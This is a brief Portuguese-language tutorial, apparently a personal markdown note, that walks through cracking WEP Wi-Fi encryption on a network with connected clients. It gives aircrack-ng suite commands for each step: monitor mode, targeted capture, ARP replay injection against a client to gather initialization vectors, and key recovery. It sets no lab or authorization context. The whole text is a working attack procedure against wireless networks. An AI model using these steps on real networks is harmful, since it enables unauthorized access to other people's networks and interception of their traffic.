## Atacando WEP com clientes conectados

#### 1° passo:

Colocar a placa em monitor mode

 ``` airmon-ng start <interface> ```

#### 2° passo:

Sniffar as redes ao redor e identificar o alvo

 ``` airodump-ng <interface> ```


#### 3° passo:

Focar o sniffing na rede alvo para capturar o trafego...

 ``` airodump-ng --essid NAME --channel CHANNEL <interface> -w CAPNAME ```

#### 4° passo:

Fazer um "bombardeio" de pacotes ARP em um clientes para podermos capturar os Vetores de Inicialização (iv's)

 ``` aireplay-ng -3 --bssid BSSIDAP -h CLIENTBSSID <interface> ```
 
* Depois de começar o envio dos pacotes ARP fique de olho no campo #Data que está no terminal do airodump. Este campo precisa  aumentar de valor até a faixa dos 70/80 mil dados, para termos certeza de que o ataque sera bem sucedido...

#### 5° passo:

Quebrar o WEP por brute force

 ``` aircrack-ng -a 1 arquivo.cap ```
 
 
...
